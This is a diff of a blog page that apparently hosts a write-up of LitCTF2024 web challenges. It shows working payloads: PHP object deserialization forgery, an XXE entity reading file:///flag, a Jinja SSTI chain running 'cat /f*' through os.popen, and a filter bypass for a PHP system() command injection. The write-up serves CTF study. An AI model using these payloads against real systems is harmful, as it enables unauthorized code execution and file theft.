@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="SAS - Serializing Authentication System简单的反序列化  &lt;?php  class User &amp;#123;      public $username;      public $password;      function __construct($username, $password) &amp;#123;          $this-&gt;user">
+        <meta name="description" content="SAS - Serializing Authentication System简单的反序列化  &lt;?php  class User &amp;#123;      public $username;      public $password;      function __construct($username, $password) &amp;#123;          $this-&gt;usernam">
 <meta property="og:type" content="article">
 <meta property="og:title" content="LitCTF2024 Web题解">
 <meta property="og:url" content="http://example.com/2024/06/01/LitCTF2024-web%E9%A2%98%E8%A7%A3/index.html">
 <meta property="og:site_name" content="p0l1st&#39;s blog">
-<meta property="og:description" content="SAS - Serializing Authentication System简单的反序列化  &lt;?php  class User &amp;#123;      public $username;      public $password;      function __construct($username, $password) &amp;#123;          $this-&gt;user">
+<meta property="og:description" content="SAS - Serializing Authentication System简单的反序列化  &lt;?php  class User &amp;#123;      public $username;      public $password;      function __construct($username, $password) &amp;#123;          $this-&gt;usernam">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754622.png">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754898.png">
@@ -440,61 +440,64 @@
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="SAS-Serializing-Authentication-System"><a href="#SAS-Serializing-Authentication-System" class="headerlink" title="SAS - Serializing Authentication System"></a>SAS - Serializing Authentication System</h1><p>简单的反序列化</p>
-<pre><code class="php">
-&lt;?php
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-class User &#123;
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>
 
-    public $username;
+    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
 
-    public $password;
+    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
 
-    function __construct($username, $password) &#123;
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 
-        $this-&gt;username = $username;
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
 
-        $this-&gt;password = $password;
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
 
-    &#125;
+    <span class="token punctuation">&#125;</span>
 
-    function isValid() &#123; return $this-&gt;username === &#39;admin&#39; &amp;&amp; $this-&gt;password === &#39;secure_password&#39;; &#125;
+    <span class="token keyword">function</span> <span class="token function-definition function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'secure_password'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
 
-&#125;
+<span class="token punctuation">&#125;</span>
 
-?&gt;
-</code></pre>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>链子</p>
-<pre><code class="php">&lt;?php
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-class User &#123;
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>
 
-    public $username=&quot;admin&quot;;
+    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>
 
-    public $password=&quot;secure_password&quot;;
+    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string double-quoted-string">"secure_password"</span><span class="token punctuation">;</span>
 
 
 
-&#125;
-$a=new User();
-echo base64_encode(serialize($a));
-?&gt;
-</code></pre>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754622.png" alt="image-20240601140250560"></p>
 <h1 id="exx"><a href="#exx" class="headerlink" title="exx"></a>exx</h1><p>xxepayload直接打</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE foo [
 &lt;!ELEMENT foo ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;
 &lt;creds&gt;
-    &lt;username&gt;&amp;xxe;&lt;/username&gt;
-    &lt;password&gt;mypass&lt;/password&gt;
-&lt;/creds&gt;
-</code></pre>
+    &lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;
+    &lt;password&gt;mypass&lt;&#x2F;password&gt;
+&lt;&#x2F;creds&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754898.png" alt="image-20240601140543276"></p>
 <h1 id="一个…-池子？"><a href="#一个…-池子？" class="headerlink" title="一个….池子？"></a>一个….池子？</h1><p>SSTI</p>
 <p>payload</p>
-<pre><code>&#123;&#123;[].__class__.__bases__[0].__subclasses__()[453].__init__.__globals__['__buil'+'tins__']['eval']('__import__("os").popen("cat /f*").read()')&#125;&#125;
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[453].__init__.__globals__[&#39;__buil&#39;+&#39;tins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat &#x2F;f*&quot;).read()&#39;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755208.png" alt="image-20240601140815281"></p>
 <h1 id="浏览器也能套娃？"><a href="#浏览器也能套娃？" class="headerlink" title="浏览器也能套娃？"></a>浏览器也能套娃？</h1><p>直接输入file:&#x2F;&#x2F;&#x2F;flag</p>
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755906.png" alt="image-20240601140911470"></p>
@@ -505,19 +508,19 @@ echo base64_encode(serialize($a));
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755144.png" alt="image-20240601141117008"></p>
 <h1 id="百万美元的诱惑"><a href="#百万美元的诱惑" class="headerlink" title="百万美元的诱惑"></a>百万美元的诱惑</h1><p>第一层套娃</p>
 <p>第二层：</p>
-<pre><code class="php">&lt;?php
-//flag in 12.php
-error_reporting(0);
-if(isset($_GET[&#39;x&#39;]))&#123;
-    $x = $_GET[&#39;x&#39;];
-    if(!preg_match(&quot;/[a-z0-9;`|#&#39;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;, $x))&#123;
-            system(&quot;cat &quot;.$x.&quot;.php&quot;);
-    &#125;
-&#125;else&#123;
-    highlight_file(__FILE__);
-&#125;
-?&gt;
-</code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">//flag in 12.php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z0-9;`|#'\"%&amp;\x09\x0a>&lt;.,?*\-=\\[\]]/i"</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat "</span><span class="token operator">.</span><span class="token variable">$x</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>payload:</p>
 <p>$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p>
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755071.png" alt="image-20240601141400819"></p>
